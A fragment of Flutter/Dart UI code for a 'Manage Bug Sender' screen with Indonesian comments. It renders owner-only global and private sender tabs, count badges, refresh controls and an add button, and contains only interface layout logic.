  // ── TAB CONTENT ───────────────────────────────────────────────
  Widget _buildTabContent(
      List<dynamic> senders, bool loading, String type) {
    final Color loaderColor =
        type == 'global' ? Colors.amber : Colors.purple;
    if (loading) {
      return Center(
          child: CircularProgressIndicator(color: loaderColor));
    }
    if (senders.isEmpty) return _buildEmpty(type);

    return RefreshIndicator(
      onRefresh: type == 'global'
          ? _fetchGlobalSenders
          : _fetchPrivateSenders,
      color: loaderColor,
      backgroundColor: Colors.black54,
      child: ListView.builder(
        padding: const EdgeInsets.only(top: 10, bottom: 100),
        itemCount: senders.length,
        itemBuilder: (_, i) => _buildSenderCard(
          Map<String, dynamic>.from(senders[i]),
          type,
        ),
      ),
    );
  }

  // ── BUILD ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text(
          'Manage Bug Sender',
          style: TextStyle(
            color: Colors.white,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.bold,
            fontSize: 16,
          ),
        ),
        actions: [
          // Badge counter:
          //   Owner     → "3G · 2P"
          //   Non-owner → "2P" (angka global tidak ditampilkan)
          Center(
            child: Container(
              margin: const EdgeInsets.only(right: 4),
              padding: const EdgeInsets.symmetric(
                  horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: _isOwner
                    ? Colors.amber.withOpacity(0.15)
                    : Colors.purple.withOpacity(0.15),
                borderRadius: BorderRadius.circular(99),
                border: Border.all(
                  color: _isOwner
                      ? Colors.amber.withOpacity(0.4)
                      : Colors.purple.withOpacity(0.3),
                ),
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  if (_isOwner) ...[
                    const Icon(Icons.workspace_premium,
                        color: Colors.amber, size: 11),
                    const SizedBox(width: 4),
                  ],
                  Text(
                    _isOwner
                        ? '${_globalSenders.length}G · ${_privateSenders.length}P'
                        : '${_privateSenders.length}P',
                    style: TextStyle(
                      color:
                          _isOwner ? Colors.amber : Colors.purple,
                      fontSize: 11,
                      fontFamily: 'Rajdhani',
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
          ),
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.white70),
            onPressed: () {
              if (_isOwner) _fetchGlobalSenders();
              _fetchPrivateSenders();
            },
          ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(48),
          child: Container(
            color: Colors.black.withOpacity(0.4),
            child: TabBar(
              controller: _tabController,
              indicatorColor:
                  _isOwner ? Colors.amber : Colors.purple,
              indicatorWeight: 2,
              labelStyle: const TextStyle(
                fontFamily: 'Rajdhani',
                fontWeight: FontWeight.bold,
                fontSize: 12,
                letterSpacing: 1.5,
              ),
              unselectedLabelStyle: const TextStyle(
                fontFamily: 'Rajdhani',
                fontSize: 12,
              ),
              labelColor: _isOwner ? Colors.amber : Colors.purple,
              unselectedLabelColor: Colors.white38,
              tabs: [
                // Owner   → Tab GLOBAL (index 0) + PRIVATE (index 1)
                // Non-owner → hanya Tab PRIVATE (index 0)
                if (_isOwner)
                  Tab(
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Icon(Icons.workspace_premium,
                            size: 14, color: Colors.amber),
                        const SizedBox(width: 6),
                        Text('GLOBAL (${_globalSenders.length})'),
                      ],
                    ),
                  ),
                Tab(
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(Icons.lock, size: 14),
                      const SizedBox(width: 6),
                      Text('PRIVATE (${_privateSenders.length})'),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),

      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [
              Colors.black,
              (_isOwner ? Colors.amber : Colors.purple)
                  .withOpacity(0.04),
            ],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
          ),
        ),
        child: SafeArea(
          child: TabBarView(
            controller: _tabController,
            children: [
              // Owner   → [Global, Private]
              // Non-owner → [Private]
              if (_isOwner)
                _buildTabContent(
                    _globalSenders, _loadingGlobal, 'global'),
              _buildTabContent(
                  _privateSenders, _loadingPrivate, 'private'),
            ],
          ),
        ),
      ),

      floatingActionButton: AnimatedBuilder(
        animation: _tabController,
        builder: (_, __) {
          // Tab Global hanya ada untuk owner (index 0 jika owner)
          final bool isGlobalTab =
              _isOwner && _tabController.index == 0;
          final Color fabColor =
              isGlobalTab ? Colors.amber : Colors.purple;

          return Container(
            decoration: BoxDecoration(
              color: fabColor.withOpacity(0.2),
              shape: BoxShape.circle,
              border:
                  Border.all(color: fabColor.withOpacity(0.35)),
            ),
            child: FloatingActionButton(
              backgroundColor: Colors.transparent,
              elevation: 0,
              onPressed: () =>
                  _showAddDialog(isGlobalTab ? 'global' : 'private'),
              child: Icon(
                isGlobalTab ? Icons.workspace_premium : Icons.add,
                color: Colors.white,
              ),
            ),
          );
        },
      ),
    );
  }
}
